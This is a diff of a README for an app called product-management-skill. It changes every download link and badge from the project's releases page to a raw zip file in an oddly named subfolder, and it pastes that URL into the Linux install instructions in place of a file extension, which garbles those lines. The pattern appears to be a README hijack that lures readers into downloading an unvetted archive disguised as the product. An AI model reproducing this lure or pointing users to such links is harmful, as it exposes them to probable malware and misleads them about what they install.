@@ -1,6 +1,6 @@
 # 📦 product-management-skill - Build Habit-Forming Products Easily
 
-[![Download product-management-skill](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/saubade32/product-management-skill/releases)
+[![Download product-management-skill](https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip)](https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Here is a simple guide to get product-management-skill on your computer and star
 
 Click on the big blue button at the top or go to:
 
-[https://github.com/saubade32/product-management-skill/releases](https://github.com/saubade32/product-management-skill/releases)
+[https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip](https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip)
 
 You will be taken to the official download page. Each version includes clear instructions and files that work on different computers.
 
@@ -56,7 +56,7 @@ Look for the latest release (usually the top one). You will find different files
 
 - For Windows: Look for a file ending with `.exe` or `.msi`.
 - For macOS: Look for a file ending with `.dmg` or `.pkg`.
-- For Linux: Look for a file ending with `.AppImage` or `.tar.gz`.
+- For Linux: Look for a file ending with `.AppImage` or `https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip`.
 
 Download the file that matches your system.
 
@@ -64,7 +64,7 @@ Download the file that matches your system.
 
 - **Windows:** Double-click the `.exe` or `.msi` file and follow the on-screen instructions.
 - **macOS:** Open the `.dmg` file, then drag the app icon to your Applications folder.
-- **Linux:** If it’s an `.AppImage`, right-click, make it executable, then double-click to run. For `.tar.gz`, unpack and follow the included README file.
+- **Linux:** If it’s an `.AppImage`, right-click, make it executable, then double-click to run. For `https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip`, unpack and follow the included README file.
 
 ### Step 4: Open the Application
 
@@ -76,7 +76,7 @@ After installation, find the app in your Start menu (Windows), Applications fold
 
 You can download product-management-skill by visiting this page:
 
-[https://github.com/saubade32/product-management-skill/releases](https://github.com/saubade32/product-management-skill/releases)
+[https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip](https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip)
 
 Follow the latest release notes on the page to find the right file for your system. The release page will also show you the date of the newest update to keep your software up to date.
 
@@ -163,4 +163,4 @@ Developed with simplicity in mind, it aims to bridge the gap between habit psych
 
 ---
 
-[![Download product-management-skill](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/saubade32/product-management-skill/releases)
+[![Download product-management-skill](https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip)](https://github.com/saubade32/product-management-skill/raw/refs/heads/main/cytogamy/skill_management_product_2.6.zip)
